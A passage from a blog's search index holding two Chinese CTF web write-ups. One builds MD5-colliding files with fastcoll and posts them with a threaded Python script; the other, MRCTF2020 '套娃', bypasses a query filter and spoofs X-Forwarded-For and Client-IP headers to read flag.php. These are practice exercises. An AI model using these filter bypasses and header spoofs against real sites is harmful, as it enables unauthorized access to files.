class="hljs-string">&#x27;HTTP_RAW_POST_DATA&#x27;</span>])? <span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;HTTP_RAW_POST_DATA&#x27;</span>] : <span class="hljs-string">&#x27;&#x27;</span>;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$streamData</span>))&#123;<br>    <span class="hljs-variable">$streamData</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;php://input&#x27;</span>);<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$streamData</span>!=<span class="hljs-string">&#x27;&#x27;</span>)&#123;<br>    <span class="hljs-variable">$ret</span> = <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$receiveFile</span>, <span class="hljs-variable">$streamData</span>, <span class="hljs-literal">true</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-variable">$ret</span> = <span class="hljs-literal">false</span>;<br>&#125;<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&quot;i&quot;</span>)) === <span class="hljs-variable">$token</span>)&#123;<br><br><span class="hljs-keyword">return</span> <span class="hljs-variable">$ret</span>;<br><span class="hljs-variable">$receiveFile</span> = <span class="hljs-string">&#x27;flag.dat&#x27;</span>;<br><span class="hljs-title function_ invoke__">receiveStreamFile</span>(<span class="hljs-variable">$receiveFile</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">md5_file</span>(<span class="hljs-variable">$receiveFile</span>)===<span class="hljs-title function_ invoke__">md5_file</span>(<span class="hljs-string">&quot;key.dat&quot;</span>))&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">hash_file</span>(<span class="hljs-string">&quot;sha512&quot;</span>,<span class="hljs-variable">$receiveFile</span>)!=<span class="hljs-title function_ invoke__">hash_file</span>(<span class="hljs-string">&quot;sha512&quot;</span>,<span class="hljs-string">&quot;key.dat&quot;</span>))&#123;<br>        <span class="hljs-variable">$ret</span>[<span class="hljs-string">&#x27;success&#x27;</span>]=<span class="hljs-string">&quot;1&quot;</span>;<br>        <span class="hljs-variable">$ret</span>[<span class="hljs-string">&#x27;msg&#x27;</span>]=<span class="hljs-string">&quot;人脸识别成功!<span class="hljs-subst">$flag</span>&quot;</span>;<br>        <span class="hljs-variable">$ret</span>[<span class="hljs-string">&#x27;error&#x27;</span>]=<span class="hljs-string">&quot;0&quot;</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">json_encode</span>(<span class="hljs-variable">$ret</span>);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>        <span class="hljs-variable">$ret</span>[<span class="hljs-string">&#x27;errormsg&#x27;</span>]=<span class="hljs-string">&quot;same file&quot;</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">json_encode</span>(<span class="hljs-variable">$ret</span>);<br>        <span class="hljs-keyword">return</span>;<br>&#125;<br>        <span class="hljs-variable">$ret</span>[<span class="hljs-string">&#x27;errormsg&#x27;</span>]=<span class="hljs-string">&quot;md5 error&quot;</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">json_encode</span>(<span class="hljs-variable">$ret</span>);<br>        <span class="hljs-keyword">return</span>;<br><br>&#125;<br><br><span class="hljs-variable">$ret</span>[<span class="hljs-string">&#x27;errormsg&#x27;</span>]=<span class="hljs-string">&quot;token error&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">json_encode</span>(<span class="hljs-variable">$ret</span>);<br><span class="hljs-keyword">return</span>;<br></code></pre></td></tr></table></figure><p>慢慢读下来，第一个函数receiveStreamFile就是接受文件用的，保证文件能够接收到。<br>关于php:&#x2F;&#x2F;input和这个$GLOBALS[‘HTTP_RAW_POST_DATA’]就不细说了，有心的同学自己查资料吧，<br>继续往下读，md5(date(“i”)) &#x3D;&#x3D;&#x3D; $token。<br>这个date(“i”)是表示当前分钟的意思啊，然后在md5加密让他和$token相等。<br>后来我才知道这个$token是可以上传的。<br>然后就是接受我们发送的文件了，再判断两个文件的md5值是否相等，而且sha1值不同。这个容易解决，key.dat我们可以直接下载下来。然后用相关工具制造一个md5相同但是sha1不同的文件。把它上传就可以了。到了这一步，后面的代码就没有什么用了。<br>应该是通过判断$ret的内容，来输出flag。因为在网页右键查看源码，还有一段信息。</p><p><img src="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202304111031269.png" alt="img"></p><p>用工具生成两个文件</p><p>那么我们能让两个程序文件的MD5一致，却又都能正常运行，并且可以做完全不同的事情么？答案是：“可以！”。要让两个不同文件的MD5值相同，可以通过一款名为fastcoll的小工具来完成（下载地址：<a href="https://www.win.tue.nl/hashclash/fastcoll_v1.0.0.5.exe.zip%EF%BC%89%E3%80%82%E6%88%91%E4%BB%AC%E5%90%8C%E6%A0%B7%E4%BB%A5%E5%88%9A%E6%89%8D%E7%9A%84test.txt%E6%9D%A5%E5%81%9A%E8%AF%95%E9%AA%8C%EF%BC%9A">https://www.win.tue.nl/hashclash/fastcoll_v1.0.0.5.exe.zip）。我们同样以刚才的test.txt来做试验：</a></p><p>把解压出来的fastcoll_v1.0.0.5.exe与test.txt放在同一目录，然后在“命令提示符”中输入：“fastcoll_v1.0.0.5.exe -i test.txt -p test.txt -o cbi.exe  cbi2.exe”并回车，在同目录中会生成名为cbi.exe和cbi2.exe文件，我们用HashX校验他们的MD5值，可以发现是完全一样的，但是在HashX中用“SHA-1”加密算法进行校验的时候，结果竟然是不同的（SHA-1加密算法生成的结果也是独一无二的）！可见这已经是完全不同的两个文件，但是他们的MD5值竟然完全相同。</p><p>fastcoll_v1.0.0.5.exe -p key.dat -o 3.dat key4.dat</p><p>fastcoll用来生成两个MD5值相同但内容不相同的文件</p><p>fastcoll_v1.0.0.5.exe -p init.txt -o 1.txt 2.txt</p><p>-p 是源文件, -o 是输出文件(两个)，同样我们也可以用工具生成四个MD5相同但内容不同的文件<br>先生成两个MD5相同但内容不同的文件</p><p>fastcoll_v1.0.0.5.exe -o 1.txt 2.txt</p><p>取其中一个文件作为源文件再生成两个MD5相同但内容不同的文件</p><p><img src="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202304111031048.png" alt="img"></p><p>这位大佬写的很详细</p><p><a href="https://www.officeba.com.cn/news/htmldata/detail/2008/8/29/590.html">https://www.officeba.com.cn/news/htmldata/detail/2008/8/29/590.html</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">import</span> threading<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">post</span>(<span class="hljs-params">data</span>):<br><span class="hljs-keyword">try</span>:<br>r=requests.post(url,data=data)<br><span class="hljs-keyword">if</span> <span class="hljs-string">&quot;ctfshow&quot;</span> <span class="hljs-keyword">in</span> r.text:<br><span class="hljs-built_in">print</span>(r.text)<br><span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br><span class="hljs-keyword">pass</span><br><br>mi=<span class="hljs-built_in">str</span>(time.localtime().tm_min)<br>m=hashlib.md5(mi.encode()).hexdigest()<br>url=<span class="hljs-string">&#x27;http://06388c62-2976-4292-920e-acaef05f83c2.challenge.ctf.show/check.php?token=&#123;&#125;&amp;php://input&#x27;</span>.<span class="hljs-built_in">format</span>(m)<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;key.dat&#x27;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    data1=f.read()<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;key4.dat&#x27;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    data2=f.read()<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">30</span>):<br>threading.Thread(target=post,args=(data1,)).start()<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">30</span>):<br>threading.Thread(target=post,args=(data2,)).start()<br></code></pre></td></tr></table></figure><p>执行代码获取flag</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>MRCTF2020套娃</title>
    <link href="/2021/03/06/MRCTF2020%E5%A5%97%E5%A8%83/"/>
    <url>/2021/03/06/MRCTF2020%E5%A5%97%E5%A8%83/</url>
    
    <content type="html"><![CDATA[<h1 id="MRCTF2020-套娃"><a href="#MRCTF2020-套娃" class="headerlink" title="[MRCTF2020]套娃"></a>[MRCTF2020]套娃</h1><p>源码中发现</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs plain">&lt;!--<br>//1st<br>$query = $_SERVER[&#x27;QUERY_STRING&#x27;];<br> <br> if( substr_count($query, &#x27;_&#x27;) !== 0 || substr_count($query, &#x27;%5f&#x27;) != 0 )&#123;<br>    die(&#x27;Y0u are So cutE!&#x27;);<br>&#125;<br> if($_GET[&#x27;b_u_p_t&#x27;] !== &#x27;23333&#x27; &amp;&amp; preg_match(&#x27;/^23333$/&#x27;, $_GET[&#x27;b_u_p_t&#x27;]))&#123;<br>    echo &quot;you are going to the next ~&quot;;<br>&#125;<br>!--&gt;<br></code></pre></td></tr></table></figure><p>了解一下$_SERVER[‘QUERY_STRING’]<a href="https://www.cnblogs.com/mitang/p/3874291.html">详解 $_SERVER 函数中QUERY_STRING和REQUEST_URI区别 - 忘忧般若汤 - 博客园</a></p><p>sbustr_count函数返回_在$query中的次数，%5f是_的url编码，第一个if语句意思就是：如果$query中有_则会die</p><p>第二个if语句，用get方法传b_u_p_t参数的值不能等于23333，对该值正则表达式&#x2F;^2333$&#x2F;意思是首尾都是2333，要同时成立</p><p>明显这里要用到<a href="https://so.csdn.net/so/search?q=%E5%AD%97%E7%AC%A6%E4%B8%B2&spm=1001.2101.3001.7020">字符串</a>解析的特性了<a href="https://www.freebuf.com/articles/web/213359.html">利用PHP的字符串解析特性Bypass - FreeBuf网络安全行业门户</a></p><p>_可以用空格来代替，绕过正则的话就要用到%0a了，因为在字符串中换行符默认为结尾，因此构造b%20u%20p%20t&#x3D;23333%0a</p><p><img src="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202304082321243.png" alt="img"></p><p>查看源码</p><p><img src="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202304082321313.png" alt="img"></p><p> js字符   直接控制台运行即可   </p><p><img src="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202304082321249.png" alt="img"></p><p> 叫我们用post方法传Merak进去   </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);  <br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;takeip.php&#x27;</span>; <br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;open_basedir&#x27;</span>,<span class="hljs-string">&#x27;.&#x27;</span>);  <br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;flag.php&#x27;</span>; <br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;Merak&#x27;</span>]))&#123;  <br>  <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);  <br>  <span class="hljs-keyword">die</span>();  <br>&#125;  <br><br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">change</span>(<span class="hljs-params"><span class="hljs-variable">$v</span></span>)</span>&#123;  <br>  <span class="hljs-variable">$v</span> = <span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$v</span>);  <br>  <span class="hljs-variable">$re</span> = <span class="hljs-string">&#x27;&#x27;</span>;  <br>  <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$v</span>);<span class="hljs-variable">$i</span>++)&#123;  <br>    <span class="hljs-variable">$re</span> .= <span class="hljs-title function_ invoke__">chr</span> ( <span class="hljs-title function_ invoke__">ord</span> (<span class="hljs-variable">$v</span>[<span class="hljs-variable">$i</span>]) + <span class="hljs-variable">$i</span>*<span class="hljs-number">2</span> );  <br>  &#125;  <br>  <span class="hljs-keyword">return</span> <span class="hljs-variable">$re</span>;  <br>&#125; <br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Local access only!&#x27;</span>.<span class="hljs-string">&quot;&lt;br/&gt;&quot;</span>; <br><span class="hljs-variable">$ip</span> = <span class="hljs-title function_ invoke__">getIp</span>(); <br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$ip</span>!=<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>) <br>  <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Sorry,you don&#x27;t have permission!  Your ip is :&quot;</span>.<span class="hljs-variable">$ip</span>; <br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$ip</span> === <span class="hljs-string">&#x27;127.0.0.1&#x27;</span> &amp;&amp; <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;2333&#x27;</span>]) === <span class="hljs-string">&#x27;todat is a happy day&#x27;</span> )&#123; <br>  <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Your REQUEST is:&quot;</span>.<span class="hljs-title function_ invoke__">change</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]); <br>  <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-title function_ invoke__">change</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>])); &#125; <br></code></pre></td></tr></table></figure><p>发现了一个flag.php文件，以及最后面有个file_get_contents(change($_GET[‘file’])); } ，肯定是绕过中间的阻碍，将flag.php传入进去</p><p>先不看函数，直接看下面，一个if语句叫我们用本地登录，用Client-ip：127.0.0.1和X-Forwarded-For：127.0.0.1</p><p><img src="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202304082322656.png" alt="img"></p><p>当你本地登陆成功的同时file_get_contents($_GET[‘2333’]) &#x3D;&#x3D;&#x3D; ‘todat is a happy day’，明显利用伪协议data即可2333&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,todat is a happy day</p><p>dG9kYXQgaXMgYSBoYXBweSBkYXk&#x3D;</p><p>现在就要看change函数了，因为file参数是传到change函数里面去的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php">    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">change</span>(<span class="hljs-params"><span class="hljs-variable">$v</span></span>)</span>&#123;  <br>        <span class="hljs-variable">$v</span> = <span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$v</span>);  <br>        <span class="hljs-variable">$re</span> = <span class="hljs-string">&#x27;&#x27;</span>;  <br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$v</span>);<span class="hljs-variable">$i</span>++)&#123;  <br>            <span class="hljs-variable">$re</span> .= <span class="hljs-title function_ invoke__">chr</span> ( <span class="hljs-title function_ invoke__">ord</span> (<span class="hljs-variable">$v</span>[<span class="hljs-variable">$i</span>]) + <span class="hljs-variable">$i</span>*<span class="hljs-number">2</span> );  <br>        &#125;  <br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$re</span>;  <br>    &#125; <br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$str</span>=<span class="hljs-string">&#x27;flag.php&#x27;</span>;<br><span class="hljs-variable">$re</span>=<span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$str</span>);<span class="hljs-variable">$i</span>++)<br>&#123;<br><br><span class="hljs-variable">$re</span>.=<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$str</span>[<span class="hljs-variable">$i</span>])-<span class="hljs-number">2</span>*<span class="hljs-variable">$i</span>);<br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-variable">$re</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p> 换算出来结果fj]a&amp;f\b   经过base64编码后ZmpdYSZmXGI&#x3D;  </p><p><img src="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202304082322355.png" alt="img"></p><p>(post:传参要删去Content-Type: application&#x2F;x-www-form-urlencoded)</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
